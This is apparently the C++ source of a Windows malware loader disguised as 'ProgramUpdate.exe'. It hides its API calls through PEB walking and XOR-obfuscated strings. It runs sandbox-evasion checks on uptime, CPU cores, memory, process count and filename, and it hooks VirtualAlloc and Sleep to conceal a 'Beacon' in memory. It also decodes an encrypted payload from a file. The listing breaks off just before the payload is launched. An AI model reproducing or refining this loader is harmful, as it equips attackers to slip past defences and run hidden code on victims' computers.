#include <windows.h>
#include <iostream>
#include <intrin.h>
#include <fstream>
#include <string>
#include <tuple>
#include <stdexcept>
#include <vector>
#include <cstdint>
#include <thread>
#include <chrono>
#include <tlhelp32.h>
#include <cmath>
#include <commctrl.h>
#include "ProgramUpdate.h"
#define ORIGINAL_FILENAME "ProgramUpdate.exe"

DWORD Beacon_flOldProtect = 0;
SIZE_T Beacon_len = 0;
LPVOID Beacon_address = nullptr;
bool Vir_FLAG = false;
HANDLE hEvent = nullptr;
LPVOID shellcode_addr = nullptr;

LPVOID(WINAPI* g_pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD) = nullptr;
VOID(WINAPI* g_pSleep)(DWORD) = nullptr;
BOOL(WINAPI* g_pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD) = nullptr;
BOOL(WINAPI* g_pVirtualFree)(LPVOID, SIZE_T, DWORD) = nullptr;

BYTE g_OldAlloc[5] = { 0 };
BYTE g_OldSleep[5] = { 0 };

typedef void (WINAPI* pGetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL(WINAPI* pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* pProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* pProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef DWORD(WINAPI* pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD pflOldProtect);

void hookVirtualAlloc();
void unhookVirtualAlloc();
void hookSleep();
void unhookSleep();
HMODULE GetKernel32();

inline std::string remove_every_bth_char(const std::string& a, int b) {
    if (b <= 0) {
        return a;
    }
    std::string result;
    result.reserve(a.size());
    int group_size = b + 1;
    for (size_t i = 0; i < a.size(); ++i) {

        if ((i + 1) % group_size != 0) {
            result += a[i];
        }

    }
    return result;
}

inline std::tuple<std::string, std::string, std::string> read_first_three_lines(const std::string& filename) {
    std::ifstream file(filename);
    std::string l1, l2, l3;
    std::getline(file, l1);
    std::getline(file, l2);
    std::getline(file, l3);
    return std::make_tuple(l1, l2, l3);
}


inline std::vector<int> build_base64_decode_table(const std::string& charset) {
    std::vector<int> table(256, -1);
    for (size_t i = 0; i < 64; ++i) {
        unsigned char c = static_cast<unsigned char>(charset[i]);
        table[c] = static_cast<int>(i);
    }
    return table;
}


inline std::vector<uint8_t> base64_decode(const std::string& encoded, const std::string& charset) {
    static const std::vector<int> standard_table = build_base64_decode_table(charset);
    const std::vector<int>& decode_table = standard_table;
    std::vector<uint8_t> result;
    result.reserve(encoded.size() * 3 / 4);
    size_t i = 0;
    int val = 0, valb = -8;
    for (char c_char : encoded) {
        unsigned char c = static_cast<unsigned char>(c_char);
        if (c == '=') break;
        if (decode_table[c] == -1) {

            continue;
        }
        val = (val << 6) | decode_table[c];
        valb += 6;

        if (valb >= 0) {
            result.push_back(static_cast<uint8_t>((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return result;
}

inline std::vector<uint8_t> xor_decode(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
    std::vector<uint8_t> result;
    result.reserve(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        uint8_t decoded = data[i] ^ key[i % key.size()];
        result.push_back(decoded);
    }
    return result;
}

inline void move_last_to_first(std::string& str) {
    if (str.size() > 1) {
        char first_char = str[0];
        for (size_t i = 0; i < str.size() - 1; ++i) {
            str[i] = str[i + 1];
        }
        str[str.size() - 1] = first_char;
    }
}

inline std::string extract_every_fourth(const char* input) {
    if (!input) return {};
    std::string result;
    size_t len = strlen(input);
    for (size_t i = 0; i < len; i += 4) {
        result += input[i] ^ 0x0A;
    }
    result.back() ^= 0x0A;
    return result;
}

inline void exit_now() {
    ExitProcess(0);
}

inline int is_more_than_3_cores() {
    HMODULE hKernel32 = GetKernel32();
    if (!hKernel32) {
        return -1;
    }
    char v0[] = { 'G' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'S' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'y' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 's' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'm' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'I' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'n' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'f' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' , 0 };
    pGetSystemInfo pfnGetSystemInfo = (pGetSystemInfo)GetProcAddress(hKernel32, extract_every_fourth(v0).c_str());
    if (!pfnGetSystemInfo) {
        FreeLibrary(hKernel32);
        return -1;
    }
    SYSTEM_INFO sys_info;
    pfnGetSystemInfo(&sys_info);
    int core_count = sys_info.dwNumberOfProcessors;
    int result = (core_count > 3) ? 10 : 5;
    FreeLibrary(hKernel32);
    return result;
}

inline int get_process_count() {
    HMODULE hKernel32 = GetKernel32();
    if (!hKernel32) {
        return -1;
    }
    char v0[] = { 'P' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'c' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 's' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 's' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , '3' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , '2' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'N' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'x' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' , 0 };
    char v1[] = { 'P' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'c' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 's' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 's' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , '3' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , '2' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'F' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'i' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 's' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' , 0 };
    char v2[] = { 'C' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'T' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'h' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , '3' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , '2' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'S' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'n' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 's' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'h' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' , 0 };

    pCreateToolhelp32Snapshot pfnCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, extract_every_fourth(v2).c_str());
    pProcess32First           pfnProcess32First = (pProcess32First)GetProcAddress(hKernel32, extract_every_fourth(v1).c_str());
    pProcess32Next            pfnProcess32Next = (pProcess32Next)GetProcAddress(hKernel32, extract_every_fourth(v0).c_str());
    if (!pfnCreateToolhelp32Snapshot || !pfnProcess32First || !pfnProcess32Next) {
        FreeLibrary(hKernel32);
        return -1;
    }
    HANDLE hProcessSnap = pfnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        FreeLibrary(hKernel32);
        return -1;
    }
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD processCount = 0;
    if (!pfnProcess32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        FreeLibrary(hKernel32);
        return -1;
    }
    do {
        processCount++;
    } while (pfnProcess32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);
    FreeLibrary(hKernel32);
    return (processCount > 50) ? 10 : 5;
}

inline int is_memory_more_than_5000MB() {
    HMODULE hKernel32 = GetKernel32();
    if (!hKernel32) {
        return -1;
    }
    char v0[] = { 'G' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'b' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'M' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'm' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'y' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'S' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'u' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 's' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'E' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'x' , 0 };
    pGlobalMemoryStatusEx pfnGlobalMemoryStatusEx = (pGlobalMemoryStatusEx)GetProcAddress(hKernel32, extract_every_fourth(v0).c_str());
    if (!pfnGlobalMemoryStatusEx) {
        FreeLibrary(hKernel32);
        return -1;
    }
    MEMORYSTATUSEX memStat;
    memStat.dwLength = sizeof(MEMORYSTATUSEX);
    if (!pfnGlobalMemoryStatusEx(&memStat)) {
        FreeLibrary(hKernel32);
        return -1;
    }
    unsigned long long totalMemInMB = memStat.ullTotalPhys / (1024 * 1024);
    int result = (totalMemInMB > 5000) ? 10 : 5;
    FreeLibrary(hKernel32);
    return result;
}

inline int is_file_renamed() {
    HMODULE hKernel32 = GetKernel32();
    if (!hKernel32) {
        return -1;
    }
    char v0[] = { 'G' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'M' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'd' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'u' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'F' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'i' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'N' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'm' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'A' , 0 };
    pGetModuleFileNameA pfnGetModuleFileNameA = (pGetModuleFileNameA)GetProcAddress(hKernel32, extract_every_fourth(v0).c_str());
    if (!pfnGetModuleFileNameA) {
        FreeLibrary(hKernel32);
        return -1;
    }
    char current_path[MAX_PATH] = { 0 };
    if (pfnGetModuleFileNameA(NULL, current_path, MAX_PATH) == 0) {
        FreeLibrary(hKernel32);
        return -1;
    }
    char* current_filename = strrchr(current_path, '\\');
    if (current_filename) {
        current_filename++;
        if (strcmp(current_filename, ORIGINAL_FILENAME) == 0) {
            FreeLibrary(hKernel32);
            return 10;
        }
        else {
            FreeLibrary(hKernel32);
            return 3;
        }
    }
    FreeLibrary(hKernel32);
    return -1;
}

inline int IsSystemUptimeOver5Minutes() {
    HMODULE hKernel32 = GetKernel32();
    if (!hKernel32) return false;
    char v0[] = { 'G' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'T' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'i' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'c' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'k' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'C' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'u' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'n' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , '6' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , '4' , 0 };

    auto pGetTickCount64 = reinterpret_cast<ULONGLONG(WINAPI*)()>(
        GetProcAddress(hKernel32, extract_every_fourth(v0).c_str())
        );
    if (!pGetTickCount64) {
        char v1[] = { 'G' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'T' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'i' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'c' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'k' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'C' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'u' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'n' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' , 0 };
        auto pGetTickCount = reinterpret_cast<DWORD(WINAPI*)()>(
            GetProcAddress(hKernel32, extract_every_fourth(v1).c_str())
            );
        if (!pGetTickCount) return false;
        return pGetTickCount() > 300000UL;
    }
    if (pGetTickCount64() > 300000ULL) {
        return 10;
    }
    return 3;
}

inline LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    unhookVirtualAlloc();
    Beacon_len = dwSize;
    Beacon_address = g_pVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
    hookVirtualAlloc();
    return Beacon_address;
}
inline void WINAPI NewSleep(DWORD dwMilliseconds) {
    if (Vir_FLAG) {
        g_pVirtualFree(shellcode_addr, 0, MEM_RELEASE);
        Vir_FLAG = false;
    }
    if (hEvent) SetEvent(hEvent);
    unhookSleep();
    g_pSleep(dwMilliseconds);
    hookSleep();

}

inline void hookVirtualAlloc() {
    DWORD oldProtect = 0;
    BYTE jmp[5] = { 0xE9, 0, 0, 0, 0 };
    memcpy(g_OldAlloc, g_pVirtualAlloc, 5);
    ULONG_PTR offset = (ULONG_PTR)NewVirtualAlloc - (ULONG_PTR)g_pVirtualAlloc - 5;
    *(DWORD*)(jmp + 1) = (DWORD)offset;
    g_pVirtualProtect(g_pVirtualAlloc, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(g_pVirtualAlloc, jmp, 5);
    g_pVirtualProtect(g_pVirtualAlloc, 5, oldProtect, &oldProtect);
}

inline void unhookVirtualAlloc() {
    DWORD oldProtect = 0;
    g_pVirtualProtect(g_pVirtualAlloc, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(g_pVirtualAlloc, g_OldAlloc, 5);
    g_pVirtualProtect(g_pVirtualAlloc, 5, oldProtect, &oldProtect);
}

inline void hookSleep() {
    DWORD oldProtect = 0;
    BYTE jmp[5] = { 0xE9, 0, 0, 0, 0 };
    memcpy(g_OldSleep, g_pSleep, 5);
    ULONG_PTR offset = (ULONG_PTR)NewSleep - (ULONG_PTR)g_pSleep - 5;
    *(DWORD*)(jmp + 1) = (DWORD)offset;
    g_pVirtualProtect(g_pSleep, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(g_pSleep, jmp, 5);
    g_pVirtualProtect(g_pSleep, 5, oldProtect, &oldProtect);
}

inline void unhookSleep() {
    DWORD oldProtect = 0;
    g_pVirtualProtect(g_pSleep, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(g_pSleep, g_OldSleep, 5);
    g_pVirtualProtect(g_pSleep, 5, oldProtect, &oldProtect);
}

inline bool is_Exception(ULONG_PTR addr) {
    if (Beacon_address && Beacon_len > 0) {
        ULONG_PTR start = (ULONG_PTR)Beacon_address;
        ULONG_PTR end = start + Beacon_len;
        return (addr >= start && addr < end);
    }
    return false;
}

inline LONG NTAPI PvectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == 0xC0000005 &&
        is_Exception(ExceptionInfo->ContextRecord->Eip)) {
        g_pVirtualProtect(Beacon_address, Beacon_len, PAGE_EXECUTE_READWRITE, &Beacon_flOldProtect);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

inline DWORD WINAPI SetNoExecutable(LPVOID lpParameter) {
    while (true) {
        if (hEvent) {
            WaitForSingleObject(hEvent, INFINITE);
            if (Beacon_address && Beacon_len > 0) {
                g_pVirtualProtect(Beacon_address, Beacon_len, PAGE_NOACCESS, &Beacon_flOldProtect);
            }
            ResetEvent(hEvent);
        }
    }
    return 0;
}


typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

inline HMODULE GetKernel32() {
    PPEB peb = (PPEB)__readfsdword(0x30);
    PLIST_ENTRY list = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = list->Flink;
    while (entry != list) {
        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)((BYTE*)entry - 0x8);
        UNICODE_STRING& baseName = module->BaseDllName;
        if (baseName.Length >= 24) {
            wchar_t* name = baseName.Buffer;
            if ((name[0] == L'k' || name[0] == L'K') &&
                (name[1] == L'e' || name[1] == L'E') &&
                (name[2] == L'r' || name[2] == L'R') &&
                (name[3] == L'n' || name[3] == L'N') &&
                (name[4] == L'e' || name[4] == L'E') &&
                (name[5] == L'l' || name[5] == L'L') &&
                name[6] == L'3' &&
                name[7] == L'2') {
                return (HMODULE)module->DllBase;
            }
        }
        entry = entry->Flink;
    }
    return NULL;
}



inline void* GetProcAddressManual(void* hModule, const char* funcName) {
    if (!hModule || !funcName) return nullptr;
    BYTE* base = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);
    WORD* ords = (WORD*)(base + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        char* name = (char*)(base + names[i]);
        if (strcmp(name, funcName) == 0) {
            return base + funcs[ords[i]];
        }
    }
    return nullptr;
}


int run( std::string filename) {
    int digit = 0;
    std::tuple<std::string, std::string, std::string> lines = read_first_three_lines(filename);
    std::string line1 = std::get<0>(lines);
    std::string line2 = std::get<1>(lines);
    std::string line3 = std::get<2>(lines);
    static long base64_table_iv = 3333333;
    static long key_iv = 99999999;
    auto start = std::chrono::steady_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
    auto end = std::chrono::steady_clock::now();
    double elapsed_seconds = std::chrono::duration<double>(end - start).count();
    int cpu_time_used = static_cast<int>(std::round(elapsed_seconds));
    base64_table_iv = base64_table_iv + 2 - cpu_time_used;
    key_iv = key_iv + 2 - cpu_time_used;
    if (elapsed_seconds < 1.5) {
        exit_now();
    }
    int flag = 0;
    flag = is_file_renamed();
    base64_table_iv = base64_table_iv + flag - 10;
    key_iv = key_iv + flag - 10;
    if (flag < 10) {
        exit_now();
    }
    flag = IsSystemUptimeOver5Minutes();
    base64_table_iv = base64_table_iv + flag - 10;
    key_iv = key_iv + flag - 10;
    if (flag < 10) {
        exit_now();
    }
    flag = is_more_than_3_cores();
    base64_table_iv = base64_table_iv + flag - 10;
    key_iv = key_iv + flag - 10;
    if (flag < 10) {
        exit_now();
    }
    flag = is_memory_more_than_5000MB();
    base64_table_iv = base64_table_iv + flag - 10;
    key_iv = key_iv + flag - 10;
    if (flag < 10) {
        exit_now();
    }
    flag = get_process_count();
    base64_table_iv = base64_table_iv + flag - 10;
    key_iv = key_iv + flag - 10;
    if (flag < 10) {
        exit_now();
    }
    for (long i = 0; i < base64_table_iv; i++) {
        move_last_to_first(line1);
    }
    for (long i = 0; i < key_iv; i++) {
        move_last_to_first(line2);
    }
    char first_char = line3[0];
    if (std::isdigit(static_cast<unsigned char>(first_char))) {
        digit = first_char - '0';
    }
    else {
        return 1;
    }
    if (!line3.empty()) {
        line3.erase(0, 1);
    }
    std::string output = remove_every_bth_char(line3, digit);
    std::vector<uint8_t> decoded = base64_decode(output, line1);
    std::vector<uint8_t> key(line2.begin(), line2.end());
    auto result = xor_decode(decoded, key);
    HMODULE hKernel32 = GetKernel32();
